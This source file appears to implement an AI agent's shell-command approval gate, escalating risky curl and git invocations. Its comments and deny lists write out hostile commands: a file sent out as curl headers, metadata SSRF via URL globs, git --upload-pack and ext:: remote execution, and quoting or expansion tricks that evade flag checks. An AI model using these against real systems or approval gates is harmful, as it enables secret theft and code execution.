  if (CURL_REDIRECT_FLAGS.test(segment)) return false;    // -L 跟随重定向 → 目标不可判 → 升级
  if (CURL_SENSITIVE_FLAGS.test(segment)) return false;   // 凭证/隐藏参数/SSRF 改路由 flag → 升级
  // curl `@filename` 从文件读内容:-d/-F/-T 已由 UPLOAD_FLAGS 拦,-H/--header @file 会把文件每行当 header 外发
  // (codex 报 `curl -H @/repo/config.txt`)→ 升级。含贴合/等号/空格形态。
  if (/(?:^|\s)(?:-H|--header)[=\s]*@/.test(segment)) return false;
  // curl -w/--write-out 的 `%output{file}` / `%output{>>file}` 指令把 write-out 写进任意文件(创建/覆盖/追加)
  // (codex 报 `curl -w '%output{/tmp/pwn}…'`)→ 升级。-w 本身(如 `%{http_code}`)无害不拦,只拦 %output{。
  if (/%output\{/i.test(segment)) return false;
  // curl 危险长选项的**唯一前缀缩写**(`--trace`/`--trace-ascii` 写调试文件、`--dump-h`=--dump-header、
  // `--loc`=--location、`--outp`=--output 等):全称正则会漏(codex 报 --trace)。逐 `--` token 取选项名,
  // 命中任一危险长选项(落盘/写文件/上传/非GET/重定向/凭证/SSRF)的前缀即升级。极短歧义缩写一并升级。
  const DANGEROUS_CURL_LONG_OPTS = [
    '--output', '--output-dir', '--remote-name', '--remote-name-all', '--remote-header-name',
    '--dump-header', '--trace', '--trace-ascii', '--trace-config', '--etag-save', '--cookie-jar',
    '--stderr', '--create-dirs', '--libcurl',
    '--data', '--data-raw', '--data-binary', '--data-urlencode', '--data-ascii', '--form', '--form-string',
    '--upload-file', '--json', '--url-query', '--request',
    '--location', '--location-trusted',
    '--user', '--netrc', '--netrc-file', '--netrc-optional', '--config', '--cookie', '--resolve', '--connect-to',
    '--unix-socket', '--abstract-unix-socket', '--proxy', '--proxy-user', '--preproxy', '--interface',
    '--variable', '--expand-url', '--oauth2-bearer', '--header', '--proxy-header', '--cert', '--key',
  ];
  for (const tok of tokens) {
    if (!tok.startsWith('--')) continue;
    const name = stripExpansions(tok.split('=')[0]!.replace(/['"\\]/g, ''));
    if (name.length >= 3 && DANGEROUS_CURL_LONG_OPTS.some((full) => full.startsWith(name))) return false;
  }
  const positional = tokens.slice(1).filter((t) => !t.startsWith('-'));
  // 非 http(s) scheme(file:// 读本地文件、scp://sftp:// 外发、ftp/dict/gopher 等)超出"命令行浏览器"面 → 升级。
  if (positional.some((t) => /^[a-z][\w+.-]*:\/\//i.test(t) && !/^https?:\/\//i.test(t))) return false;
  // URL 内嵌凭证(`https://user:pass@host`):curl 会把 userinfo 作为 Basic auth 外发 → 凭证泄漏面 → 升级
  // (codex 报;host 判定处会剥掉 userinfo,故必须在此先拦)。匹配 authority 段(首个 `/` 前)出现的 `@`。
  if (positional.some((t) => /^https?:\/\/[^/?#]*@/i.test(t))) return false;
  if (positional.some((t) => t.includes('?'))) return false; // 查询串外发面(含无 scheme 的 host?query)
  // curl URL glob(默认开启):`{a,b}` 列表 / `[1-9]`·`[a-z]` 范围会展开成多个 URL,字面 token 静态
  // 无法预判展开后的 host → `curl 'http://{example.com,169.254.169.254}/…'` 会连 metadata 一起抓
  // (codex 报)。除非显式 `-g`/`--globoff` 关闭 glob,含 `{}`/`[]` 的 URL 目标一律升级。
  const globOff = /(?:^|\s)-[a-zA-Z]*g\b|(?:^|\s)--globoff\b/.test(segment);
  if (!globOff && positional.some((t) => isFetchTargetToken(t) && /[{}[\]]/.test(t))) return false;
  // curl 可接多个 URL 并逐个抓取 → 必须校验**每一个** URL 目标,不能只看第一个
  // (`curl https://public http://169.254.169.254/...` 会把 metadata 也抓回来)。
  const targets = positional.filter(isFetchTargetToken);
  if (targets.length === 0) return false;               // 认不出 URL 目标 → fail-closed 升级
  if (targets.some(isInternalFetchTarget)) return false; // 任一目标是云 metadata / localhost / 内网 → 升级
  return true;
}


const SAFE_GIT_GLOBAL_FLAGS: ReadonlySet<string> = new Set([
  '--no-pager', '--no-replace-objects', '--bare',
  '--literal-pathspecs', '--glob-pathspecs', '--noglob-pathspecs',
  '--icase-pathspecs', '--no-optional-locks',
]);


function isTrustedGitCwdPath(
  target: string | undefined,
  workspaceRoots: string[],
  cwd: string | undefined,
  cwdUnknown: boolean,
  platform: NodeJS.Platform | undefined,
): boolean {
  // Git 会从 -C 指向的仓库读取配置；配置可激活外部 helper。纯词法检查无法确认工作区
  // 子目录不是指向区外的 symlink，因此只允许它精确等于宿主已确认的 cwd（无 cwd 时为主工作区根）。
  if (!target || /[$`~{}*?[\]]/.test(target) || cwdUnknown) return false;
  const forward = toForwardSlashes(target);
  // `chdir` 先跟随 symlink、再处理 `..`。词法 normalize 会把 `/repo/link/..` 错折成
  // `/repo`，所以只允许不含 `.`/`..`/空分量的绝对路径，且必须精确等于宿主确认 cwd。
  if (!isAbsolutePath(forward) || forward.split('/').slice(1).some((part) => part === '' || part === '.' || part === '..')) return false;
  const base = cwd ?? workspaceRoots[0]!;
  if (!base) return false;
  const aliasFirmlinks = (platform ?? process.platform) === 'darwin';
  return canonicalPath(forward, aliasFirmlinks) === canonicalPath(base, aliasFirmlinks);
}


function parseGitInvocation(
  tokens: string[],
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): { sub?: string; args: string[] } | undefined {
  // Git 的全局选项位于子命令之前。`git -C /repo show` 中 `/repo` 不是子命令；若直接
  // 寻找第一个非 `-` token，会把它误判为子命令而把只读 show 降级为 prompt。
  // 这里只消费能够静态确认的全局选项。未知/缺值选项一律返回 undefined，让调用方 fail-closed。
  let index = 1;
  const allowConfigOverrides = opts.gitContentRead !== undefined || opts.gitConfigRead !== undefined;
  while (index < tokens.length) {
    const token = tokens[index]!;
    if (token === '--') {
      index++;
      break;
    }
    if (!token.startsWith('-')) {
      return { sub: token, args: tokens.slice(index + 1) };
    }
    if (token === '-C') {
      if (!isTrustedGitCwdPath(tokens[index + 1]!, workspaceRoots, opts.cwd, opts.cwdUnknown === true, opts.platform)) return undefined;
      index += 2;
      continue;
    }
    if (token === '-c' || token === '--config-env') {
      if (!allowConfigOverrides) return undefined;
      if (index + 1 >= tokens.length || tokens[index + 1]! === '') return undefined;
      index += 2;
      continue;
    }
    if (/^-c.+/.test(token) || /^--config-env=.+/.test(token)) {
      if (!allowConfigOverrides) return undefined;
      index++;
      continue;
    }
    if (token === '--git-dir' || token === '--work-tree') return undefined;
    if (token === '--namespace') {
      if (index + 1 >= tokens.length || tokens[index + 1]! === '') return undefined;
      index += 2;
      continue;
    }
    const attachedCwd = /^-C=?(.*)$/.exec(token);
    if (attachedCwd) {
      if (!isTrustedGitCwdPath(attachedCwd[1]!, workspaceRoots, opts.cwd, opts.cwdUnknown === true, opts.platform)) return undefined;
      index++;
      continue;
    }
    if (/^--(?:git-dir|work-tree)=/.test(token)) return undefined;
    if (/^--namespace=.+/.test(token)) {
      index++;
      continue;
    }
    if (SAFE_GIT_GLOBAL_FLAGS.has(token)) {
      index++;
      continue;
    }
    return undefined;
  }
  if (index >= tokens.length) return undefined;
  return { sub: tokens[index]!, args: tokens.slice(index + 1) };
}


function classifyGit(
  tokens: string[],
  segment: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): ReviewVerdict {
  // 高风险 git(强推/硬重置/clean -f)已在 REVIEW_REQUIRED_PATTERNS 命中,这里分只读 vs 写。
  // 写文件 / 跑外部程序的选项(即便子命令"只读")→ 升级:
  //   -o/--output(diff/format-patch/show 写文件,无 shell `>` 可捕获);
  //   --ext-diff(跑外部 diff 驱动=RCE);
  //   -O/--open-files-in-pager(git grep 用指定 pager 打开匹配文件 → 执行任意程序=RCE,
  //     `git grep --open-files-in-pager=./payload pat` 会跑 ./payload)。
  //   --filters/--textconv(git cat-file 对内容跑 clean/smudge filter 或 textconv 驱动 → 执行任意程序=RCE)。
  //   --upload-pack/--receive-pack/--exec(ls-remote/fetch/push 等把 <exec> 当命令跑,连本地仓库也执行 →
  //     `git ls-remote --upload-pack='sh payload' repo` = RCE,codex 报)。
  if (/(?:^|\s)-[oO](?:\b|\S)/.test(segment)) return 'prompt';  // 短选项 -o/-O(写文件 / pager 执行器)
  // 长选项按**前缀**匹配:git 接受唯一前缀缩写(`--upload-p=`、甚至 `--u=` 都等于 --upload-pack,codex 报),
  // 只匹配全称会漏。逐 token 取选项名(去引号/展开),命中任一危险长选项的前缀即升级。极短歧义缩写
  // (`--o`/`--e` 等)被一并升级 —— 这类在 git 里本就歧义报错,fail-closed 可接受。
  const DANGEROUS_GIT_LONG_OPTS = ['--output', '--ext-diff', '--open-files-in-pager', '--filters', '--textconv', '--upload-pack', '--receive-pack', '--exec'];
  for (const tok of tokens) {
    if (!tok.startsWith('--')) continue;
    const name = stripExpansions(tok.split('=')[0]!.replace(/['"\\]/g, ''));
    if (name.length >= 3 && DANGEROUS_GIT_LONG_OPTS.some((full) => full.startsWith(name))) return 'prompt';
  }
  // 远程助手传输 `ext::<cmd>` / `fd::` 会把 URL 里的命令交给 shell 执行(RCE);即便 ls-remote 最终报错,
  // 命令也已跑(codex 报:`git ls-remote 'ext::sh -c …'`)。任何 git 命令带 ext::/fd:: 传输 → 升级。
  if (/(?:^|[\s'"=])(?:ext|fd)::/.test(segment)) return 'prompt';
  const invocation = parseGitInvocation(tokens, workspaceRoots, opts);
  if (!invocation?.sub || !SAFE_GIT_SUBCOMMANDS.has(invocation.sub)) {
    // `git config --get/--list` 只读;其它 git(commit/checkout/merge/fetch/config 写…)升级。
    if (invocation?.sub === 'config' && /--(?:get|list|get-all)\b/.test(segment)) return 'auto-approve';
    return 'prompt';
  }
  const { sub, args } = invocation;
  // reflog 有破坏性写模式:expire / delete / drop 删除恢复历史(不可逆);只放行 show/exists/裸 reflog(默认 show)。
  if (sub === 'reflog') {
    const next = args.find((t) => !t.startsWith('-'));
    if (next && /^(?:expire|delete|drop)$/.test(next)) return 'prompt';
    return 'auto-approve'; // 裸 / show / exists
  }
  // branch/tag/remote 的子命令名相同但有写变体:只放行读形态,写变体升级。
  if (sub === 'branch' || sub === 'tag') {
    // 删除/改名/复制/强制 flag,或子命令后带位置参数(= 新建分支/标签)→ 写。
    // --edit-description invokes $EDITOR(可执行任意外部程序)→ 升级(copilot P1)。
    if (/\s-(?:d|D|m|M|c|C)\b|\s--(?:delete|move|copy|force|edit-description)\b/.test(segment)) return 'prompt';
    const after = args.filter((t) => !t.startsWith('-'));
    if (after.length > 0) return 'prompt';
    return 'auto-approve';
  }
  if (sub === 'remote') {
    const next = args.find((t) => !t.startsWith('-'));
    if (next && /^(?:add|remove|rm|rename|set-url|set-head|set-branches|prune|update)$/.test(next)) {
      return 'prompt';
    }
    // `remote show` 不带 -n 会联系远端(ext:://insteadOf 可执行 payload,codex P1)→ 升级;带 -n 只读本地配置放行。
    if (next === 'show' && !args.includes('-n')) return 'prompt';
    return 'auto-approve'; // bare / -v / get-url / show -n 等不触网的只读形态
  }
  return 'auto-approve';
}


function classifyShellSegment(
  segment: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): ReviewVerdict {
  const rawTokens = tokenize(segment);
  const unwrapped = unwrapCommand(
    rawTokens,
    opts.cwd ?? workspaceRoots[0]!,
    opts.cwdUnknown === true,
  );
  const tokens = unwrapped.tokens;
  // 包装器可改变内层 cwd（如 `env -C /extra git …`）。不能把该路径当作可信审批基准；
  // 只要 Git 前经过改目录或 cwd 变得未知，保守交给 prompt。
  const initialCwd = opts.cwd ?? workspaceRoots[0]!;
  const aliasFirmlinks = (opts.platform ?? process.platform) === 'darwin';
  const wrapperChangedCwd = unwrapped.cwdUnknown
    || (unwrapped.cwd !== undefined && initialCwd !== undefined
      && canonicalPath(unwrapped.cwd, aliasFirmlinks) !== canonicalPath(initialCwd, aliasFirmlinks));
  // 裸 env / 未指定 VARIABLE 的 printenv 会输出整个进程环境(含 provider API key)，不能交给
  // reviewer 自行静默 allow。`-0` / `--null` 只改分隔符，不缩小输出范围；只有存在非选项
  // VARIABLE 参数时才算具名读取并留在灰区。`env FOO=bar cmd` 仍按内层命令分类。
  const printenvArgs = executableName(tokens[0]! ?? '') === 'printenv' ? tokens.slice(1) : [];
  let printenvHasVariable = false;
  let printenvOptionsEnded = false;
  for (const token of printenvArgs) {
    if (!printenvOptionsEnded && token === '--') {
      printenvOptionsEnded = true;
      continue;
    }
    if (printenvOptionsEnded || !token.startsWith('-')) {
      printenvHasVariable = true;
      break;
    }
  }
  const dumpsFullEnvironment =
    (tokens.length === 0 && rawTokens.some((token) => executableName(token) === 'env'))
    || (executableName(tokens[0]! ?? '') === 'printenv' && !printenvHasVariable);
  if (dumpsFullEnvironment) return 'prompt-each-time';
  // 剥壳后为空段:裸 `env`/`printenv`(dump 环境变量,含凭证)、或纯包裹器无内层命令 —— fail-closed 升级。
  if (tokens.length === 0) return 'prompt';
  // executableName 归一 `.exe`/大小写:Windows/Git Bash 下 `ls.exe`/`cat.exe`/`git.exe status` 等良性
  // 只读命令不应平白落灰区弹窗(与"尽量不打扰"一致);PATH 污染是已存档残口,归一不新增风险。
  const bin = executableName(tokens[0]!);
  // 去引号标记 + 去反斜杠转义:防 -ex'ec' / -ex\ec / -'o' 这类把 flag/命令拆开的拼接绕过(bash 会把它们
  // 还原成 -exec 等)。再抹掉参数展开(-ex${UNSET}ec / --pr${UNSET}e=…,codex 报):否则 find/rg 等的
  // 执行 flag 被藏在展开里、审查漏放行、bash 展开成空后才执行。flag/命令检测都在此串上跑。
  const deQuoted = stripExpansions(segment.replace(/['"\\]/g, ''));
  // 去引号内容:判重定向时引号内的 `>` 是数据不是重定向(如 git log --format='%h>%s')。
  // 再抹掉指向安全伪设备的重定向(`2>/dev/null`、`>/dev/null`、`&>/dev/null`):写 /dev/null
  // 等同丢弃、无落盘副作用,是实机语料里最高频的静音写法,不该把整段只读命令拖进灰区。
  //
  // **只剥真正的丢弃 / 终端型设备**。`/dev/stdin` `/dev/stdout` `/dev/stderr` `/dev/fd/N`
  // 是**继承描述符的别名** —— 进程的 stdout 若被重定向到文件,`>/dev/stdout` 就会截断那个
  // 文件,凭命令字符串证明不了安全(review 报:这几种形态原本落灰区,被一起剥掉后变成了
  // 直接放行)。它们不剥即可 —— 落回灰区交 AI 审阅器判,与基线同档,不升红线。
  // (与 SAFE_DEVICE_PATH / isProtectedSystemPath 的伪设备白名单同口径)。`/dev/null/x`、
  // `/dev/nullx` / `/dev/null.tmp` / `/dev/null-foo` 等相近路径不匹配,仍按普通文件写升级。
  // 输出重定向(写文件)/ 命令替换(执行任意内容):任何命令带它都不能算只读放行,统一升级。
  // 必须挡在 git/fetch/readonly 判定之前 —— 否则 `curl x > ~/.bashrc`、`cat f > /etc/y` 会被误放行。
  if (segmentHasSideEffectRedirectOrSubstitution(segment)) return 'prompt';
  // 带替换/默认值的参数展开(${X:-ec} 等)可代入任意文本、拼出危险 flag/命令,静态不可求值 → 升级
  // (codex 报:`-ex${UNSET:-ec}` 抹空后是 -ex、bash 代入 ec 成 -exec)。挡在 readonly/git/fetch 放行前。
  if (SUBSTITUTION_EXPANSION.test(segment)) return 'prompt';
  // 花括号展开 `{a,b}`/`{x..y}` 或 ANSI-C 转义引用 `$'…'` 出现在命令名(tokens[0])或某个 flag(-…)里 →
  // bash 在分词前展开/解码,可拼出任意命令/flag(`-ex{e..e}c`→-exec、`-ex$'\x65'c`→-exec),静态不可预测 → 升级。
  // 只查命令名/flag 位:位置参数里的 brace 只影响文件名、`grep $'\t' f` 的 ANSI-C 是数据,均不误升级;curl URL glob 另处理。
  if (tokens.some((t, i) => (i === 0 || t.startsWith('-')) && (BRACE_EXPANSION.test(t) || t.includes("$'")))) return 'prompt';
  // 显式路径的可执行文件(./ls、/tmp/ls、bin/ls)不是白名单里的系统工具,不能靠 basename 放行 ——
  // 只信任 **OS 自有**、非特权用户不可写的 bin 目录(/usr/bin、/bin、/usr/sbin、/sbin)。/usr/local/bin 与
  // /opt/homebrew/bin 在 macOS/Homebrew 下当前用户可写(可被替换成木马),不再算可信系统 bin(codex 报);
  // 其余含 `/` 的命令一律 fail-closed 升级。
  const cmd0Raw = tokens[0]!.replace(/\\/g, '');
  // `..` セグメント正規化でパストラバーサルを遮断 — `/usr/bin/../local/bin/ls` → `/usr/local/bin/ls`(信頼できない)。
  // 注:中文注释: `..` 归一化防路径穿越(/usr/bin/../local/bin/ls 穿越出可信 bin 目录)(copilot 报)。
  const cmd0 = cmd0Raw.startsWith('/')
    ? '/' +
      cmd0Raw
        .split('/')
        .slice(1)
        .reduce<string[]>((parts, seg) => {
          if (seg === '..') parts.pop();
          else if (seg !== '' && seg !== '.') parts.push(seg);
          return parts;
        }, [])
        .join('/')
    : cmd0Raw;
  if (cmd0.includes('/') && !/^\/(?:usr\/s?bin|s?bin)\//.test(cmd0)) return 'prompt';
  if (bin === 'git') {
    if (wrapperChangedCwd) return 'prompt';
    return classifyGit(tokens, deQuoted, workspaceRoots, opts);
  }
  if (isSafeFetch(bin, deQuoted, tokens)) return 'auto-approve';
  if (isSafeReadonlyBin(bin, deQuoted, tokens)) return 'auto-approve';
  // sed 的纯数字地址打印(`sed -n 1,80p f`)与 gh 的只读查询子命令:实机语料的高频只读段,
  // 静态可证安全,不进灰区(误报源自实机语料回归,见 auto-review.corpus 测试)。
  if (bin === 'sed' && isSafeReadonlySed(tokens)) return 'auto-approve';
  if (bin === 'gh' && isSafeReadonlyGh(tokens)) return 'auto-approve';
  // 其余(含所有写操作、未知命令)进入灰区，由轻量 reviewer 静默 allow/block/ask。
  return 'prompt';
}


const FIRST_DATA_ARGUMENT_BINS: ReadonlySet<string> = new Set([
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'sed', 'jq', 'yq', 'date',
]);


type ReaderOptionKind =
  | 'data'
  | 'data-file'
  | 'selector'
  | 'filter'
  | 'aux-file'
  | 'aux-file-list'
  | 'named-data'
  | 'named-file'
  | 'type-definition'
  | 'type-include'
  | 'type-exclude'
  | 'type-clear';

type ReaderLongOption = { name: string; kind: ReaderOptionKind };


const GREP_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--regexp', kind: 'data' },
  { name: '--file', kind: 'data-file' },
  { name: '--include', kind: 'selector' },
  { name: '--exclude', kind: 'filter' },
  { name: '--include-from', kind: 'aux-file' },
  { name: '--exclude-from', kind: 'aux-file' },
];

const RG_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--regexp', kind: 'data' },
  { name: '--file', kind: 'data-file' },
  { name: '--glob', kind: 'selector' },
  { name: '--iglob', kind: 'selector' },
  { name: '--ignore-file', kind: 'aux-file' },
  { name: '--type-add', kind: 'type-definition' },
  { name: '--type', kind: 'type-include' },
  { name: '--type-not', kind: 'type-exclude' },
  { name: '--type-clear', kind: 'type-clear' },
];

const SED_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--expression', kind: 'data' },
  { name: '--file', kind: 'data-file' },
];

const JQ_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--from-file', kind: 'data-file' },
  { name: '--arg', kind: 'named-data' },
  { name: '--argjson', kind: 'named-data' },
  { name: '--argfile', kind: 'named-file' },
  { name: '--slurpfile', kind: 'named-file' },
  { name: '--rawfile', kind: 'named-file' },
];

const DIFF_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--from-file', kind: 'data-file' },
  { name: '--to-file', kind: 'data-file' },
];

const FILE_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--files-from', kind: 'data-file' },
  { name: '--magic-file', kind: 'aux-file-list' },
];

const FILES0_FROM_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--files0-from', kind: 'data-file' },
];

const DU_LONG_OPTIONS: readonly ReaderLongOption[] = [
  ...FILES0_FROM_LONG_OPTIONS,
  { name: '--exclude', kind: 'filter' },
  { name: '--exclude-from', kind: 'aux-file' },
];

const SORT_LONG_OPTIONS: readonly ReaderLongOption[] = [
  ...FILES0_FROM_LONG_OPTIONS,
  { name: '--random-source', kind: 'aux-file' },
];

const DATE_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--file', kind: 'data-file' },
  { name: '--reference', kind: 'aux-file' },
];

const AG_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--file-search-regex', kind: 'selector' },
  { name: '--ignore', kind: 'filter' },
  { name: '--ignore-dir', kind: 'filter' },
  { name: '--path-to-ignore', kind: 'aux-file' },
];

const TREE_LONG_OPTIONS: readonly ReaderLongOption[] = [
  { name: '--infofile', kind: 'aux-file' },
];


function readerLongOptions(bin: string): readonly ReaderLongOption[] {
  if (bin === 'grep' || bin === 'egrep' || bin === 'fgrep') return GREP_LONG_OPTIONS;
  if (bin === 'rg') return RG_LONG_OPTIONS;
  if (bin === 'sed') return SED_LONG_OPTIONS;
  if (bin === 'jq' || bin === 'yq') return JQ_LONG_OPTIONS;
  if (bin === 'diff') return DIFF_LONG_OPTIONS;
  if (bin === 'file') return FILE_LONG_OPTIONS;
  if (bin === 'wc') return FILES0_FROM_LONG_OPTIONS;
  if (bin === 'du') return DU_LONG_OPTIONS;
  if (bin === 'sort') return SORT_LONG_OPTIONS;
  if (bin === 'date') return DATE_LONG_OPTIONS;
  if (bin === 'ag') return AG_LONG_OPTIONS;
  if (bin === 'tree') return TREE_LONG_OPTIONS;
  return [];
}


function resolveReaderLongOption(bin: string, name: string): ReaderOptionKind | null {
  const specs = readerLongOptions(bin);
  const exact = specs.find((spec) => spec.name === name);
  if (exact) return exact.kind;

  // GNU readers accept unique long-option abbreviations (`--fil=.env`). If every
  // matching expansion has the same semantic kind, that kind is still provable.
  const candidates = specs.filter((spec) => spec.name.startsWith(name));
  const kinds = new Set(candidates.map((spec) => spec.kind));
  return kinds.size === 1 ? candidates[0]!?.kind ?? null : null;
}


function readerShortOptionKind(
  bin: string,
  option: string,
  platform: NodeJS.Platform = process.platform,
): ReaderOptionKind | null {
  if (bin === 'grep' || bin === 'egrep' || bin === 'fgrep' || bin === 'sed') {
    if (option === 'e') return 'data';
    if (option === 'f') return 'data-file';
  }
  if (bin === 'rg') {
    if (option === 'e') return 'data';
    if (option === 'f') return 'data-file';
    if (option === 'g') return 'selector';
    if (option === 't') return 'type-include';
    if (option === 'T') return 'type-exclude';
  }
  if ((bin === 'jq' || bin === 'yq') && option === 'f') return 'data-file';
  if (bin === 'ag' && option === 'G') return 'selector';
  if (bin === 'file' && option === 'f') return 'data-file';
  if (bin === 'file' && (option === 'm' || option === 'M')) return 'aux-file-list';
  if (bin === 'file' && (option === 'e' || option === 'F' || option === 'P')) return 'data';
  if (bin === 'date' && option === 'f') return platform === 'darwin' ? 'data' : 'data-file';
  if (bin === 'date' && option === 'r') return platform === 'darwin' ? 'data' : 'aux-file';
  if (bin === 'date' && (option === 'd' || option === 'I' || option === 's'
      || option === 'v' || option === 'z')) return 'data';
  return null;
}


function selectorAlternativeCannotMatchDotenv(value: string): boolean {
  const basename = value.replace(/\\/g, '/').split('/').pop() ?? '';
  if (!/[*?\[]/.test(basename)) return !isDotenvCredentialPath(value);
  if (/^\[(?:!|\^)\.\]/.test(basename)) return true;
  const literalPrefix = basename.slice(0, basename.search(/[*?\[]/));
  const couldStartDotenv = '.env'.startsWith(literalPrefix) || literalPrefix.startsWith('.env.');
  return Boolean(literalPrefix) && !couldStartDotenv;
}


function expandBraceSequence(value: string): string[] | null {
  const match = /^(-?\d+|[A-Za-z])\.\.(-?\d+|[A-Za-z])(?:\.\.(-?\d+))?$/.exec(value);
  if (!match) return null;
  const numeric = /^-?\d+$/.test(match[1]!) && /^-?\d+$/.test(match[2]!);
  const alphabetic = /^[A-Za-z]$/.test(match[1]!) && /^[A-Za-z]$/.test(match[2]!);
  if (!numeric && !alphabetic) return ['*'];
  const start = numeric ? Number(match[1]!) : match[1]!.charCodeAt(0);
  const end = numeric ? Number(match[2]!) : match[2]!.charCodeAt(0);
  const step = match[3]! ? Math.abs(Number(match[3]!)) : 1;
  if (!Number.isSafeInteger(start) || !Number.isSafeInteger(end) || !Number.isSafeInteger(step) || step === 0) return ['*'];
  const count = Math.floor(Math.abs(end - start) / step) + 1;
  if (count > 64) return ['*'];
  const direction = start <= end ? 1 : -1;
  return Array.from({ length: count }, (_, index) => {
    const item = start + (index * step * direction);
    return numeric ? String(item) : String.fromCharCode(item);
  });
}


const BRACE_EXPANSION_MAX_DEPTH = 8;

const BRACE_EXPANSION_CANDIDATE_BUDGET = 4_096;


function* commaBraceAlternatives(value: string): Generator<string> {
  let start = 0;
  for (let index = 0; index <= value.length; index += 1) {
    if (index < value.length && value.charAt(index) !== ',') continue;
    yield value.slice(start, index);
    start = index + 1;
  }
}


function braceAlternatives(value: string): Iterable<string> | null {
  if (value.includes(',')) return commaBraceAlternatives(value);
  return expandBraceSequence(value);
}


function braceExpansionCouldMatch(value: string, predicate: (candidate: string) => boolean): boolean {
  let remainingCandidates = BRACE_EXPANSION_CANDIDATE_BUDGET;
  const visit = (candidate: string, depth: number): boolean => {
    // An expansion we cannot finish proving safe must stay behind the credential consent gate.
    if (remainingCandidates <= 0) return true;
    remainingCandidates -= 1;

    const match = /^(.*?)\{([^{}]+)\}(.*)$/.exec(candidate);
    if (!match) return predicate(candidate);
    if (depth >= BRACE_EXPANSION_MAX_DEPTH) return true;

    const alternatives = braceAlternatives(match[2]!);
    if (!alternatives) return predicate(candidate);
    for (const alternative of alternatives) {
      if (visit(`${match[1]!}${alternative}${match[3]!}`, depth + 1)) return true;
    }
    return false;
  };
  return visit(value, 0);
}


function selectorCouldMatchDotenv(value: string): boolean {
  return !value.startsWith('!') && braceExpansionCouldMatch(
    value,
    (alternative) => !selectorAlternativeCannotMatchDotenv(alternative),
  );
}


const CREDENTIAL_SELECTOR_WORD_BOUNDARY = '\u0001';

const SHELL_CREDENTIAL_SELECTOR_GLOBS = [...new Set(
  SENSITIVE_CREDENTIAL_GLOB_PATTERNS.flatMap((pattern) => {
    const variants: string[] = [pattern];
    const directory = pattern.endsWith('/**') ? pattern.slice(0, -3) : undefined;
    if (directory) {
      variants.push(directory, directory + CREDENTIAL_SELECTOR_WORD_BOUNDARY + '**');
    } else if (pattern !== '**/.env' && pattern !== '**/.env.*' && !pattern.endsWith('*')) {
      variants.push(pattern + CREDENTIAL_SELECTOR_WORD_BOUNDARY + '**');
    }
    return variants.flatMap((variant) =>
      variant.startsWith('**/') ? [variant, variant.slice(3)] : [variant]);
  }),
)];


type ShellSelectorGlobLabel =
  | { kind: 'literal'; value: string }
  | { kind: 'class'; values: ReadonlySet<string>; negated: boolean }
  | { kind: 'non-slash' | 'non-word' | 'any' };


type ShellSelectorGlobToken =
  | { kind: 'literal'; value: string }
  | { kind: 'class'; label: ShellSelectorGlobLabel }
  | { kind: 'one' | 'star' | 'globstar' | 'nonword' };


function shellSelectorClassLabel(value: string): ShellSelectorGlobLabel | null {
  if (!value || value.includes('[:')) return null;
  let cursor = 0;
  const negated = value.startsWith('!') || value.startsWith('^');
  if (negated) cursor += 1;
  const values = new Set<string>();
  while (cursor < value.length) {
    const start = value.charCodeAt(cursor);
    if (value[cursor + 1]! === '-' && cursor + 2 < value.length) {
      const end = value.charCodeAt(cursor + 2);
      if (end < start || end - start > 64) return null;
      for (let code = start; code <= end; code += 1) {
        values.add(String.fromCharCode(code).toLowerCase());
      }
      cursor += 3;
    } else {
      values.add(value[cursor]!.toLowerCase());
      cursor += 1;
    }
    if (values.size > 128) return null;
  }
  return values.size > 0 ? { kind: 'class', values, negated } : null;
}


const SHELL_SELECTOR_MAX_PATTERN_LENGTH = 4_096;


function shellSelectorGlobTokens(pattern: string): ShellSelectorGlobToken[] | null {
  if (pattern.length > SHELL_SELECTOR_MAX_PATTERN_LENGTH || /[{}()|+@]/.test(pattern)) return null;
  const normalized = pattern.replace(/\\/g, '/').toLowerCase();
  const tokens: ShellSelectorGlobToken[] = [];
  for (let index = 0; index < normalized.length; index += 1) {
    const char = normalized[index]!;
    if (char === CREDENTIAL_SELECTOR_WORD_BOUNDARY) {
      tokens.push({ kind: 'nonword' });
      continue;
    }
    if (char === '[') {
      const end = normalized.indexOf(']', index + 1);
      if (end < 0) return null;
      const label = shellSelectorClassLabel(normalized.slice(index + 1, end));
      if (!label) return null;
      tokens.push({ kind: 'class', label });
      index = end;
      continue;
    }
    if (char === ']') return null;
    if (char === '?') {
      tokens.push({ kind: 'one' });
      continue;
    }
    if (char === '*') {
      let end = index + 1;
      while (normalized[end]! === '*') end += 1;
      tokens.push({ kind: end - index >= 2 ? 'globstar' : 'star' });
      index = end - 1;
      continue;
    }
    tokens.push({ kind: 'literal', value: char });
  }
  return tokens;
}


function shellSelectorGlobTransition(
  tokens: readonly ShellSelectorGlobToken[],
  index: number,
): { next: number; label: ShellSelectorGlobLabel } | null {
  const token = tokens[index]!;
  if (!token) return null;
  if (token.kind === 'literal') return { next: index + 1, label: token };
  if (token.kind === 'class') return { next: index + 1, label: token.label };
  if (token.kind === 'one') return { next: index + 1, label: { kind: 'non-slash' } };
  if (token.kind === 'nonword') return { next: index + 1, label: { kind: 'non-word' } };
  if (token.kind === 'star') return { next: index, label: { kind: 'non-slash' } };
  return { next: index, label: { kind: 'any' } };
}


function shellSelectorClassAllows(
  label: Extract<ShellSelectorGlobLabel, { kind: 'class' }>,
  value: string,
): boolean {
  if (value === '/') return false;
  return label.negated !== label.values.has(value);
}


function shellSelectorGlobLabelsOverlap(
  left: ShellSelectorGlobLabel,
  right: ShellSelectorGlobLabel,
): boolean {
  if (left.kind === 'any' || right.kind === 'any') return true;
  if (left.kind === 'literal' && right.kind === 'literal') return left.value === right.value;
  if (left.kind === 'literal') {
    if (right.kind === 'class') return shellSelectorClassAllows(right, left.value);
    if (right.kind === 'non-word') return !/[a-z0-9_]/i.test(left.value);
    return left.value !== '/';
  }
